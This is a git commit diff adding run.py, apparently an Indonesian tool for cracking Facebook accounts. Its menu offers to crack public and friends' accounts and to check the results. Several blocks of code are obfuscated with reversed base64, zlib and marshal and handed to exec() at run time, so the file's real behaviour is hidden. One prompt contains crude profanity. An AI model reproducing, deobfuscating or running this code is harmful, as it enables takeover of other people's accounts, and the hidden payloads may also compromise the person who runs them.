e8fbcef1ef2292107f14e3abe59c864121c75888
HAI SIR ✌ <131268629+GithubCadangan@users.noreply.github.com>
2024-02-16 21:19:23 +0700

    Add files via upload

---
+++ run.py
@@ -0,0 +1,40 @@
+#└── MAU NGAPAIN SIR? = ENCODE DEF ONLY BY YOSHII XHURAYRA
+#└── SIZE 2.27KB 
+#└── FACEBOOK : Yoshii CyberScurity
+from rich import print as sprint
+from rich.tree import Tree
+import random,os,time,base64
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+def Bersih():
+	os.system('clear') 
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'Yt/h6EgfCh8/IjWGlAPAlBvRYN8oXFlWz2MVfxZKYN9vOlI7e5fncx2D50FOTT9H+b4HCqTST4XAnO5Y0NmVX90LFxxk6dR6mrd3YUftR34mamzlJTwNsuX2nv9e8MAoQcYKiw3duTaIQiGQ6r7lgD5zdVz6U3pKbK66FusGTHdGeU6CeK86wirb02/SJj7TXCtimv9FiYeOTHm2QoWoGWYjnGYgjBU8x4cbvO4u8cfBdsLMbngMlURrCp7BoPJa8iF5AvGPfqrJ6DTnSzc/YoGFfI6gpFhtRuUm0VdDtJopWN4WjNVRkVtn6PrzrzDC0npbP3U2rvLPIPjNX9DnFwjAm4EvTvovnll+R8J4qqfEfGcF03yPCOF9p8jgTQPL4WMSJHHiR+KR+Rr0Z0GMZM9JdPVJAv1rKUK5AGOVYS+tlIVLII7j4G0dIQ1lcfYOu/0ddSONyvfSv0H5qX3IdTguGEB/To/xiVIIgXzSCJUoRRMWgbSJahwOpdzFRVkC7WgKjRfdKhAC1FxRbpxRpfTfUA1wL1jUtxJe'))
+_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b"E3#\x9b\xbf\x85\x0be\x92L\xea{ux}\r\xf5\xa9\xdaLBuYTG\x92\xa0\xf0\x19\x05\xb1\x1e'\x99\xbc\xfc\xb19\xab4\xad\xcc\x0ci\x8c\\\xb2\xff\xf1\xee+\xa8\xf5\x85\xa125N\x82\x0crXW\x82\xafgW\x9c\xcb\x00p\xcb\x1a\xde\x9d\xa5\x08\x82\x85\xf3\xa3\xc2\xd2\x91\xd5\xd6\xdf8\xb0:O\xbaD)\xc7\xa9=\xef\xf8\xb7\x8b\xf94K{r\x8d\nC8\xa4\xc08\xa9\x8d@\x9ew\x0b\x8d\xc4\x80\x9c&\xdan\x9f\x8ap\xd7E\x100\x82\x0eA\x8c-\x9cx"))
+def Menunya():
+	Bersih() 
+	Banner() 
+	user_rmbf= Tree('',style='')
+	user_rmbf.add('1 crack publik') 
+	user_rmbf.add('2 crack teman') 
+	user_rmbf.add('3 cek result crack') 
+	user_rmbf.add('0 exit program') 
+	sprint(user_rmbf) 
+	InputFitur() 
+
+def InputFitur():
+	Rmbf = input('\n Chooise : ') 
+	if Rmbf in["1"]:
+		Fitur1() 
+	elif Rmbf in["2"]:
+		Fitur2() 
+	elif Rmbf in["3"]:
+		Fitur3() 
+	elif Rmbf in['0']:
+		print(' selamat tinggal sir wikwok') 
+	elif Rmbf in[""," "]:
+		print(' Pilih yang bener kontol'),time.sleep(2) 
+		Menunya() 
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=IiTbzSA/4czX4CaakPGA4c2TUTiEB79QjIFmHFBol9vL45eUKTdpl8vPsc1HzS+SpfLLlDxrxmJk6fPi5qJNZfC7kTItMq2tXqNnxH417WXGJiE89hzHXBFXcLxUBJJYLXJoPej9hSQQ3K1UlRJ/WMPZDuBQAjwKELzVyJe'))
